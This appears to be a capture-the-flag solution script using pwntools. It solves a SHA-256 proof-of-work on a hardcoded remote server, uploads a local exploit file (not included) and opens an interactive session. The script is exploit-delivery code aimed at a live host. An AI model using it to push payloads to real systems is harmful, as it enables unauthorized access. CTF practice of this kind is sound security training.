#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
from pwnlib.util.iters import bruteforce
import hashlib
context.log_level="debug"

def hash(x):
    return hashlib.sha256(x).hexdigest()

r=remote("111.186.63.13",10001)
r.recvuntil("XXXX+")
prefix=r.recvuntil(")")[:-1]
print prefix
r.recvuntil("== ")
result=r.recvline()[:-1]
print result
x=bruteforce(lambda x:hash(x+prefix)==result,string.ascii_letters+string.digits,length=4,method='downfrom')

r.sendline(x)

with open("./exp","r") as f:
    exp = f.read()

r.sendline(str(len(exp)))
r.send(exp)


r.interactive()
